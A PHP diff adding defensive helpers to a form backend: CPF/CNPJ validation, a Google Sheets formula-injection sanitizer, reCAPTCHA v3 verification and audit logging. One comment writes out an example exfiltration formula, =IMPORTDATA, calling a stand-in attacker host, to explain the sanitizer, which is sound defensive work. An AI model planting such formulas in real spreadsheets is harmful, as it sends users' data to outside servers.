@@ -167,3 +167,153 @@ function generateCSRFToken() {
 function validateCSRFToken($token) {
     return isset($_SESSION['csrf_token']) && hash_equals($_SESSION['csrf_token'], $token);
 }
+
+/**
+ * Valida CPF (dígitos verificadores)
+ */
+function isValidCPF($cpf) {
+    $cpf = preg_replace('/[^0-9]/', '', $cpf);
+    if (strlen($cpf) != 11 || preg_match('/^(\d)\1{10}$/', $cpf)) {
+        return false;
+    }
+    for ($t = 9; $t < 11; $t++) {
+        $sum = 0;
+        for ($i = 0; $i < $t; $i++) {
+            $sum += (int)$cpf[$i] * (($t + 1) - $i);
+        }
+        $digit = ((10 * $sum) % 11) % 10;
+        if ((int)$cpf[$t] !== $digit) {
+            return false;
+        }
+    }
+    return true;
+}
+
+/**
+ * Valida CNPJ ou CPF conforme o tamanho
+ */
+function isValidCNPJOrCPF($documento) {
+    $digitos = preg_replace('/[^0-9]/', '', $documento);
+    if (strlen($digitos) == 11) {
+        return isValidCPF($digitos);
+    }
+    if (strlen($digitos) == 14) {
+        return isValidCNPJ($digitos);
+    }
+    return false;
+}
+
+/**
+ * Sanitiza valor que será gravado em célula do Google Sheets (anti-injeção de fórmula)
+ *
+ * A planilha recebe os dados com valueInputOption USER_ENTERED, que interpreta
+ * como fórmula qualquer célula iniciada por '=', '+', '-', '@', tab ou CR.
+ * Um atacante poderia gravar algo como '=IMPORTDATA("https://evil.tld/x")' no
+ * campo "nome completo" e, ao recalcular, a planilha exfiltraria para um servidor
+ * externo o conteúdo das células (IMPORTDATA/IMPORTXML etc.). Prefixar uma
+ * aspa simples (') força o Sheets a tratar o conteúdo como texto puro.
+ */
+function sanitizeSheetsValue(string $value): string {
+    $primeiro = mb_substr($value, 0, 1);
+    if ($primeiro === '=' || $primeiro === '+' || $primeiro === '-' || $primeiro === '@' || $primeiro === "\t" || $primeiro === "\r") {
+        return "'" . $value;
+    }
+    return $value;
+}
+
+/**
+ * Verifica reCAPTCHA v3 no servidor (fail-closed: em caso de dúvida, rejeita)
+ */
+function verifyRecaptcha($token, $scoreMinimo = 0.5) {
+    $token = trim((string)$token);
+    if ($token === '') {
+        return false;
+    }
+    $secret = defined('RECAPTCHA_SECRET_KEY') ? RECAPTCHA_SECRET_KEY : '';
+    if ($secret === '') {
+        return false;
+    }
+    $endpoint = 'https://www.google.com/recaptcha/api/siteverify';
+    $payload = http_build_query(['secret' => $secret, 'response' => $token]);
+    $raw = false;
+    if (function_exists('curl_init')) {
+        $ch = curl_init($endpoint);
+        curl_setopt_array($ch, [
+            CURLOPT_POST => true,
+            CURLOPT_POSTFIELDS => $payload,
+            CURLOPT_RETURNTRANSFER => true,
+            CURLOPT_CONNECTTIMEOUT => 5,
+            CURLOPT_TIMEOUT => 10,
+        ]);
+        $raw = curl_exec($ch);
+        curl_close($ch);
+    } else {
+        $context = stream_context_create(['http' => [
+            'method' => 'POST',
+            'header' => "Content-type: application/x-www-form-urlencoded\r\n",
+            'content' => $payload,
+            'timeout' => 10,
+        ]]);
+        $raw = @file_get_contents($endpoint, false, $context);
+    }
+    if ($raw === false) {
+        return false;
+    }
+    $result = json_decode($raw);
+    if (!is_object($result) || empty($result->success)) {
+        return false;
+    }
+    if (isset($result->score) && (float)$result->score < $scoreMinimo) {
+        return false;
+    }
+
+    // Action: o token precisa ter sido gerado com a mesma action do formulário
+    // (grecaptcha.execute(RECAPTCHA_SITE_KEY, { action: 'submit' }) no form.js)
+    if (!isset($result->action) || $result->action !== 'submit') {
+        return false;
+    }
+
+    // Hostname: se informado pelo Google, o token só é válido se tiver sido
+    // gerado no host da aplicação (APP_URL). Em produção o Host da requisição
+    // (HTTP_HOST) NÃO é aceito como alternativa porque é um cabeçalho
+    // controlável pelo cliente; ele só entra na lista fora da produção para
+    // não quebrar o ambiente local (php -S / localhost).
+    if (isset($result->hostname)) {
+        $hostsValidos = [];
+        if (defined('APP_URL')) {
+            $hostAppUrl = parse_url(APP_URL, PHP_URL_HOST);
+            if (is_string($hostAppUrl) && $hostAppUrl !== '') {
+                $hostsValidos[] = strtolower($hostAppUrl);
+            }
+        }
+        $ambienteProd = (defined('APP_ENV') && APP_ENV === 'production');
+        if (!$ambienteProd && !empty($_SERVER['HTTP_HOST'])) {
+            $hostsValidos[] = strtolower((string)$_SERVER['HTTP_HOST']);
+        }
+        if (!in_array(strtolower((string)$result->hostname), $hostsValidos, true)) {
+            return false;
+        }
+    }
+
+    return true;
+}
+
+/**
+ * Log estruturado de auditoria/integração em JSONL (nunca interrompe o fluxo)
+ */
+function logIntegration($evento, array $dados = []) {
+    $logDir = __DIR__ . '/../../logs/';
+    if (!is_dir($logDir)) {
+        @mkdir($logDir, 0755, true);
+    }
+    $registro = [
+        'timestamp' => date('c'),
+        'evento' => $evento,
+        'dados' => $dados,
+    ];
+    @file_put_contents(
+        $logDir . 'integrations-' . date('Y-m-d') . '.jsonl',
+        json_encode($registro, JSON_UNESCAPED_UNICODE | JSON_PARTIAL_OUTPUT_ON_ERROR) . PHP_EOL,
+        FILE_APPEND
+    );
+}
